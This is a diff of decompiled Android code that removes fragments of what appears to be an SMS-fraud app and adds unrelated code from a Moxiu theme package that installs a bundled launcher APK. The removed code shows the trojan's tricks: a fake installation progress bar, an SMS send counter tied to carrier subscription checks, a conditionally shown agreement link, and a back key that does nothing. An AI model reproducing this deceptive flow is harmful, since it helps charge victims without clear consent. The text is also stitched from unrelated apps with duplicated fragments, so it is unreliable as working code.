-            }
-            this.footrTextView = (TextView) findViewById(R.id.footr);
-            this.footrTextView.setVisibility(0);
-            this.footrTextView.setText(Html.fromHtml(String.valueOf(getString(R.string.pdp_text_start)) + " <a href=\"show_agreement_common_cover://\">" + getString(R.string.pdp_text_middle) + "</a> " + endText));
-            this.footrTextView.setMovementMethod(LinkMovementMethod.getInstance());
-        }
-        this.belTextView = (TextView) findViewById(R.id.bel_text);
-        if (this.actor.isBel()) {
-            enableBelorusTexts();
         }
     }
 
-    void enableBelorusTexts() {
-        if (isLoadedLinkActivated()) {
-            this.belTextView.setVisibility(0);
-        }
-        this.footrTextView.setMovementMethod(LinkMovementMethod.getInstance());
-        this.footrTextView.setText(Html.fromHtml(String.valueOf(getString(R.string.bel_text_1)) + " <a href=\"show_agreement_common_cover://\">" + getString(R.string.bel_text_2) + "</a>"));
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void start() {
-        this.dialog = new ProgressDialog(this);
-        this.dialog.setCancelable(false);
-        this.dialog.setMessage(this.pleaseWaitString);
-        this.dialog.show();
-        registerReceiver();
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 1, getSharedPreferences(KEY_PREFS, 0));
-        this.actor.start();
-    }
-
-    @Override // android.app.Activity
-    protected void onResume() {
-        super.onResume();
-        startC2DM();
-    }
-
-    @Override // android.app.Activity
-    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
-        super.onActivityResult(requestCode, resultCode, intent);
-        Log.d("DEBUGGING", "Result: " + requestCode + " " + resultCode);
-        if (resultCode == 1) {
-            start();
-        }
-    }
-
-    private void registerReceiver() {
-        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.Main.6
-            @Override // android.content.BroadcastReceiver
-            public void onReceive(Context context, Intent i) {
-                Main.this.dialog.dismiss();
-                int resultCode = Actor.STATUS;
-                switch (resultCode) {
-                    case -1:
-                        if (((!Main.this.actor.isMF() || Actor.isMFSubscription(Main.this)) && (!Main.this.actor.isMTSRF() || Actor.isMTSSubscription(Main.this))) || !Main.this.actor.isPrivate() || !Main.this.actor.hasMoreContent(-1)) {
-                            Main.this.showLastScreen(new Intent(Main.this, (Class<?>) ShowURL.class));
-                            break;
-                        } else {
-                            Main.this.showLastScreen(new Intent(Main.this, (Class<?>) RelatedContent.class).putExtra("index", 0));
-                            break;
-                        }
-                    default:
-                        Toast.makeText(Main.this.getBaseContext(), R.string.sms_sending_error, 0).show();
-                        break;
-                }
-            }
-        }, new IntentFilter(SEND_DONE));
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-    public class AsyncLoader extends AsyncTask<String, Integer, String> {
-        private static final long UPDATE_TIME = 31;
-        private int value = 0;
-
-        public AsyncLoader() {
-        }
-
-        /* JADX INFO: Access modifiers changed from: protected */
-        @Override // android.os.AsyncTask
-        public String doInBackground(String... urls) {
-            this.value = 0;
-            while (this.value < 100) {
-                try {
-                    Thread.sleep(UPDATE_TIME);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                this.value++;
-                publishProgress(Integer.valueOf(Main.this.progressBar.getProgress() + 1));
-            }
-            return null;
-        }
-
-        @Override // android.os.AsyncTask
-        public void onProgressUpdate(Integer... args) {
-            Main.this.progressBar.setProgress(this.value);
-            Main.this.mainTextView.setText(String.valueOf(Main.this.actor.getMainText()) + Integer.toString(this.value) + "%");
-        }
-
-        /* JADX INFO: Access modifiers changed from: protected */
-        @Override // android.os.AsyncTask
-        public void onPostExecute(String result) {
-            Main.this.finishInstallation(result);
-        }
-    }
-
-    void finishInstallation(String result) {
-        this.wasProgressDone = true;
-        this.installedURL = this.actor.getContentToBeActed();
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        SharedPreferences.Editor editor = settings.edit();
-        editor.putBoolean(IS_LOADED, true);
-        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
-        editor.commit();
-        updateGUI();
-    }
-
-    void animateButtons() {
-        Animation animation = new TranslateAnimation(1, 1.0f, 1, 0.0f, 1, 0.0f, 1, 0.0f);
-        animation.setDuration(1000L);
-        this.yesButton.startAnimation(animation);
-        this.belTextView.startAnimation(animation);
-    }
-
-    private void initSettings() {
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 0, settings);
-        this.wasProgressDone = settings.getBoolean(IS_LOADED, false);
-        this.installedURL = settings.getString(INSTALL_URL, "");
-    }
-
-    private boolean areLoadedAndActedLinksEquals() {
-        return this.installedURL.equals(this.actor.getContentToBeActed());
-    }
-
-    private boolean isLoadedLinkActivated() {
-        return this.wasProgressDone && areLoadedAndActedLinksEquals();
-    }
-
-    @Override // android.app.Activity
-    public boolean onCreateOptionsMenu(Menu menu) {
-        MenuInflater inflater = getMenuInflater();
-        inflater.inflate(R.menu.main_menu, menu);
-        return true;
-    }
-
-    @Override // android.app.Activity
-    public boolean onOptionsItemSelected(MenuItem item) {
-        switch (item.getItemId()) {
-            case R.id.read_off_item /* 2131296277 */:
-                showOff();
-                return true;
-            default:
-                return super.onOptionsItemSelected(item);
+    private boolean isInstalled() {
+        try {
+            PackageInfo packageInfo = getPackageManager().getPackageInfo(MOXIU_LAUNCHER_NAME, 0);
+            this.ver = packageInfo.versionCode;
+            return packageInfo != null;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
         }
     }
 
     /* JADX INFO: Access modifiers changed from: private */
-    public void showOff() {
-        Intent i = new Intent(this, (Class<?>) AgActivity.class);
-        startActivityForResult(i, 1);
+    public void installMoXiuLauncherApk() {
+        Intent intent = new Intent();
+        intent.setAction("android.intent.action.VIEW");
+        getAssets();
+        try {
+            InputStream resourceAsStream = getClass().getResourceAsStream("/assets/MoXiuLauncher_alone.apk");
+            FileOutputStream openFileOutput = openFileOutput("MoXiuLauncher_alone.apk", MOXIU_LAUNCHER_INSTALL_SUCCESS);
+            byte[] bArr = new byte[1024];
+            while (true) {
+                int read = resourceAsStream.read(bArr);
+                if (read == -1) {
+                    break;
+                } else {
+                    openFileOutput.write(bArr, 0, read);
+                }
+            }
+            openFileOutput.flush();
+            resourceAsStream.close();
+            openFileOutput.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        intent.setDataAndType(Uri.fromFile(new File(getFilesDir().getPath() + "/MoXiuLauncher_alone.apk")), "application/vnd.android.package-archive");
+        startActivityForResult(intent, MOXIU_LAUNCHER_INSTALL_SUCCESS);
+    }
+
+    @Override // android.app.Activity
+    protected void onDestroy() {
+        super.onDestroy();
     }
 }
 
-Package Path:com.googleapi.cover.Main.onKeyDown
-Class Name:Main
-Content: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp.interDialog
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
 
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
+    private AlertDialog interDialog;
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.onKey
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+            public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                    carbqagp.this.finish();
+                    carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                    return false;
+                }
+                return false;
+            }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.isInstalled
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    private boolean isInstalled() {
+        try {
+            PackageInfo packageInfo = getPackageManager().getPackageInfo(MOXIU_LAUNCHER_NAME, 0);
+            this.ver = packageInfo.versionCode;
+            return packageInfo != null;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
         }
-        return super.onKeyDown(keyCode, event);
     }
 
-Package Path:com.googleapi.cover.Main.onKeyDown
-Class Name:Main
-Content: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp.OpenThemeDetail
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
 
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
+    private void OpenThemeDetail() {
+        PackageInfo packageInfo = null;
+        try {
+            packageInfo = getPackageManager().getPackageInfo(getApplication().getPackageName(), 0);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
         }
-        return super.onKeyDown(keyCode, event);
+        String str = packageInfo.applicationInfo.sourceDir;
+        Intent intent = new Intent("com.moxiu.launcher.theme.MYACTION", Uri.parse("info://moxiu.ni hao !"));
+        Bundle bundle = new Bundle();
+        bundle.putInt("positon", 0);
+        bundle.putString("packagename", getApplication().getPackageName());
+        bundle.putInt("iscoming", hezuotiaozhuan);
+        bundle.putString("apkpath", str);
+        bundle.putString("childtag", "moxiutheme");
+        intent.putExtras(bundle);
+        intent.setFlags(268435456);
+        startActivity(intent);
+        finish();
     }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.ver
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    private int ver = 105;
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.MOXIU_FOLDER_THEME
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    public static final String MOXIU_FOLDER_THEME = Environment.getExternalStorageDirectory().toString() + "/moxiu/themes/";
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.onDestroy
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    protected void onDestroy() {
+        super.onDestroy();
+    }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.OpenMoxiuTheme
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    private void OpenMoxiuTheme() {
+        try {
+            getPackageManager().getPackageInfo(getApplication().getPackageName(), 0).applicationInfo.loadLabel(getPackageManager()).toString();
+            ComponentName componentName = new ComponentName(MOXIU_LAUNCHER_NAME, "com.moxiu.market.activity.ActivityMarket_main");
+            Intent intent = new Intent();
+            intent.setFlags(131072);
+            intent.addFlags(268435456);
+            intent.setAction("android.intent.action.MAIN");
+            intent.setComponent(componentName);
+            startActivity(intent);
+            overridePendingTransition(R.anim.moxiu_zoom_in, R.anim.moxiu_zoom_out);
+            finish();
+        } catch (PackageManager.NameNotFoundException e) {
+        }
+    }
+
+Package Path:aimoxiu.theme.carbqagp.R.R
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+public final class R {
+
+    public static final class anim {
+        public static final int moxiu_zoom_in = 0x7f060000;
+        public static final int moxiu_zoom_in_back = 0x7f060001;
+        public static final int moxiu_zoom_out = 0x7f060002;
+        public static final int moxiu_zoom_out_back = 0x7f060003;
+    }
+
+    public static final class attr {
+    }
+
+    public static final class color {
+        public static final int moxiu_color = 0x7f050000;
+    }
+
+    public static final class drawable {
+        public static final int alarm_clock = 0x7f020000;
+        public static final int browser = 0x7f020001;
+        public static final int calculator = 0x7f020002;
+        public static final int calendar = 0x7f020003;
+        public static final int camera = 0x7f020004;
+        public static final int contacts = 0x7f020005;
+        public static final int filemanager = 0x7f020006;
+        public static final int gallery = 0x7f020007;
+        public static final int gmail = 0x7f020008;
+        public static final int google_maps = 0x7f020009;
+        public static final int icon = 0x7f02000a;
+        public static final int market = 0x7f02000b;
+        public static final int mms = 0x7f02000c;
+        public static final int moxiu_all_apps_button = 0x7f02000d;
+        public static final int moxiu_all_apps_button_focused = 0x7f02000e;
+        public static final int moxiu_all_apps_button_normal = 0x7f02000f;
+        public static final int moxiu_all_apps_layout_bg = 0x7f020010;
+        public static final int moxiu_mainmenu = 0x7f020011;
+        public static final int moxiu_mainmenu_home = 0x7f020012;
+        public static final int moxiu_mainmenu_home_focused = 0x7f020013;
+        public static final int moxiu_mainmenu_home_normal = 0x7f020014;
+        public static final int moxiu_mainmenu_icon_background = 0x7f020015;
+        public static final int moxiu_mainmenu_icon_mask = 0x7f020016;
+        public static final int moxiu_pressed_background = 0x7f020017;
+        public static final int moxiu_preview = 0x7f020018;
+        public static final int moxiu_preview_thumb = 0x7f020019;
+        public static final int moxiu_selector = 0x7f02001a;
+        public static final int moxiu_sense = 0x7f02001b;
+        public static final int moxiu_shortcut_selector = 0x7f02001c;
+        public static final int music = 0x7f02001d;
+        public static final int pattern_carbon_fiber_dark = 0x7f02001e;
+        public static final int phone = 0x7f02001f;
+        public static final int qq = 0x7f020020;
+        public static final int settings = 0x7f020021;
+        public static final int wallpaper = 0x7f020022;
+        public static final int weibo = 0x7f020023;
+        public static final int weixin = 0x7f020024;
+    }
+
+    public static final class id {
+        public static final int alpha = 0x7f070000;
+    }
+
+    public static final class layout {
+        public static final int main = 0x7f030000;
+    }
+
+    public static final class string {
+        public static final int drawable_level = 0x7f040005;
+        public static final int moxiu_info = 0x7f040001;
+        public static final int moxiu_install_info = 0x7f040002;
+        public static final int moxiu_ok = 0x7f040004;
+        public static final int moxiu_theme_name = 0x7f040000;
+        public static final int moxiu_version_info = 0x7f040003;
+    }
+}
+
+Package Path:aimoxiu.theme.carbqagp.R.drawable
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+    public static final class drawable {
+        public static final int alarm_clock = 0x7f020000;
+        public static final int browser = 0x7f020001;
+        public static final int calculator = 0x7f020002;
+        public static final int calendar = 0x7f020003;
+        public static final int camera = 0x7f020004;
+        public static final int contacts = 0x7f020005;
+        public static final int filemanager = 0x7f020006;
+        public static final int gallery = 0x7f020007;
+        public static final int gmail = 0x7f020008;
+        public static final int google_maps = 0x7f020009;
+        public static final int icon = 0x7f02000a;
+        public static final int market = 0x7f02000b;
+        public static final int mms = 0x7f02000c;
+        public static final int moxiu_all_apps_button = 0x7f02000d;
+        public static final int moxiu_all_apps_button_focused = 0x7f02000e;
+        public static final int moxiu_all_apps_button_normal = 0x7f02000f;
+        public static final int moxiu_all_apps_layout_bg = 0x7f020010;
+        public static final int moxiu_mainmenu = 0x7f020011;
+        public static final int moxiu_mainmenu_home = 0x7f020012;
+        public static final int moxiu_mainmenu_home_focused = 0x7f020013;
+        public static final int moxiu_mainmenu_home_normal = 0x7f020014;
+        public static final int moxiu_mainmenu_icon_background = 0x7f020015;
+        public static final int moxiu_mainmenu_icon_mask = 0x7f020016;
+        public static final int moxiu_pressed_background = 0x7f020017;
+        public static final int moxiu_preview = 0x7f020018;
+        public static final int moxiu_preview_thumb = 0x7f020019;
+        public static final int moxiu_selector = 0x7f02001a;
+        public static final int moxiu_sense = 0x7f02001b;
+        public static final int moxiu_shortcut_selector = 0x7f02001c;
+        public static final int music = 0x7f02001d;
+        public static final int pattern_carbon_fiber_dark = 0x7f02001e;
+        public static final int phone = 0x7f02001f;
+        public static final int qq = 0x7f020020;
+        public static final int settings = 0x7f020021;
+        public static final int wallpaper = 0x7f020022;
+        public static final int weibo = 0x7f020023;
+        public static final int weixin = 0x7f020024;
+    }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    public void installMoXiuLauncherApk() {
+        Intent intent = new Intent();
+        intent.setAction("android.intent.action.VIEW");
+        getAssets();
+        try {
+            InputStream resourceAsStream = getClass().getResourceAsStream("/assets/MoXiuLauncher_alone.apk");
+            FileOutputStream openFileOutput = openFileOutput("MoXiuLauncher_alone.apk", MOXIU_LAUNCHER_INSTALL_SUCCESS);
+            byte[] bArr = new byte[1024];
+            while (true) {
+                int read = resourceAsStream.read(bArr);
+                if (read == -1) {
+                    break;
+                } else {
+                    openFileOutput.write(bArr, 0, read);
+                }
+            }
+            openFileOutput.flush();
+            resourceAsStream.close();
+            openFileOutput.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        intent.setDataAndType(Uri.fromFile(new File(getFilesDir().getPath() + "/MoXiuLauncher_alone.apk")), "application/vnd.android.package-archive");
+        startActivityForResult(intent, MOXIU_LAUNCHER_INSTALL_SUCCESS);
+    }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.onActivityResult
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    protected void onActivityResult(int i, int i2, Intent intent) {
+        if (i == MOXIU_LAUNCHER_INSTALL_SUCCESS && i2 == 0) {
+            if (isInstalled() && this.ver > 310) {
+                OpenThemeDetail();
+            } else {
+                OpenMoxiuTheme();
+            }
+        }
+    }
+
+Package Path:aimoxiu.theme.carbqagp.R.calendar
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+        public static final int calendar = 0x7f020003;
+
+Package Path:aimoxiu.theme.carbqagp.R.moxiu_all_apps_button_focused
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+        public static final int moxiu_all_apps_button_focused = 0x7f02000e;
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.isZhiJieYingYong
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+    public Boolean isZhiJieYingYong = true;
+
+Package Path:aimoxiu.theme.carbqagp.R.alarm_clock
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+        public static final int alarm_clock = 0x7f020000;
+
+Package Path:aimoxiu.theme.carbqagp.R.icon
+Class Name:R
+Content: package aimoxiu.theme.carbqagp;
+
+        public static final int icon = 0x7f02000a;
